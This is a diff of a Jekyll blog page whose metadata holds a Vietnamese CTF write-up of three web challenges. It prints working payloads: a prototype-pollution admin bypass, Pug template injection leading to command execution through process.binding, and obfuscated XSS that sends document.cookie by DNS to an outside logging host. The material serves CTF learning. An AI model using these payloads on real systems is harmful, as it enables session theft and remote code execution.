@@ -43,7 +43,7 @@
 <meta property="twitter:title" content="W1 Playground Writeup" />
 <meta name="twitter:site" content="@anzuukino" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-01T20:17:41+07:00","datePublished":"2024-04-30T23:00:00+07:00","description":"Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: Super sanitizer Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user Blacklist của bài này như sau &lt;imgoner=&#39;\\&quot;&#39;&gt; Lỗi của bài này nằm ở đây Khi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \\x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com) Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+&quot;.hackerwebsite.com&quot; nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã ascii Đây là payload để leak 1 nữa flag (do flag khá dài nên phải leak 2 lần) 1 aa&lt;img src=1 onerror=&#39;document.body.innerHTML=&quot; &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,48,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;&quot;;&#39;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Payload thứ 2 để leak phần còn lại 1 aa&lt;img src=1 onerror=&#39;document.body.innerHTML=&quot; &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;&quot;;&#39;&gt;aaaaaaaa Decode mã ascii và lấy flag Flag: W1{WASM_101_and_some_js_gadget_hope_you_enjoyed:)))))))))))))))))))))))))))))))))))))))))@0x4161}","headline":"W1 Playground Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/W1Playground/"},"url":"http://localhost:4000/posts/W1Playground/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-01T20:44:39+07:00","datePublished":"2024-04-30T23:00:00+07:00","description":"Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: Super sanitizer Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user Blacklist của bài này như sau &lt;imgoner=&#39;\\&quot;&#39;&gt; Lỗi của bài này nằm ở đây Khi chúng ta cho 1 ký tự có độ dài là 0x300 thì raw_str[0x300] sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là \\x00 từ đó blacklist sẽ trở thành rỗng -&gt; bypass filter Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng window.location.href=hackerwebsite.com vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ flag.hackerwebsite.com) Nhưng leak kiểu gì? Mình đã thử leak kiểu btoa(document.cookie)+&quot;.hackerwebsite.com&quot; nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là document.cookie.charCodeAt(0-&gt;document.cookie.length-1) để leak ra từng ký tự của flag sang mã ascii Đây là payload để leak 1 nữa flag (do flag khá dài nên phải leak 2 lần) 1 aa&lt;img src=1 onerror=&#39;document.body.innerHTML=&quot; &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,48,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;&quot;;&#39;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Payload thứ 2 để leak phần còn lại 1 aa&lt;img src=1 onerror=&#39;document.body.innerHTML=&quot; &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;&quot;;&#39;&gt;aaaaaaaa Decode mã ascii và lấy flag Flag: W1{WASM_101_and_some_js_gadget_hope_you_enjoyed:)))))))))))))))))))))))))))))))))))))))))@0x4161}","headline":"W1 Playground Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/W1Playground/"},"url":"http://localhost:4000/posts/W1Playground/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1743,7 +1743,7 @@
 
 <time
   
-  data-ts="1714569461"
+  data-ts="1714571079"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
@@ -2113,6 +2113,13 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/KCSCCTF/">KCSC 2024</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/GreyCTF/">GreyCTF 2024</a>
         </li>
       
@@ -2121,13 +2128,6 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
         
         <li class="text-truncate lh-lg">
           <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/AsisCTF/">Asis CTF 2023 Writeup</a>
         </li>
       
     </ul>
@@ -2151,6 +2151,21 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
 
 
 
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -2557,22 +2572,22 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
         <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
       
     </div>
   </section>
@@ -2628,6 +2643,18 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
 
   
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
   
 
   
@@ -2929,6 +2956,21 @@ Bài 1 hello:
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -3285,22 +3327,22 @@ Bài 1 hello:
         <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
       
     </div>
   </section>
